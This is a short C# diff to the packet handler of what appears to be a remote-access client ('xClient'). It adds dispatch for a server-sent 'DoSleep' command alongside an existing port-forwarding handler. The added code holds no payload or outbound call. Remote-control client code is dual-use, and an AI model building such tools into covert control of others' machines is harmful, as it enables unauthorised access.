@@ -210,6 +210,10 @@ namespace xClient.Core.Packets
             {
                 LocalPortForwardCommandHandler.HandleCommand(client, packet);
             }
+            else if (type == typeof(ServerPackets.DoSleep))
+            {
+                CommandHandler.HandleDoSleep((ServerPackets.DoSleep)packet, client);
+            }
         }
     }
 }
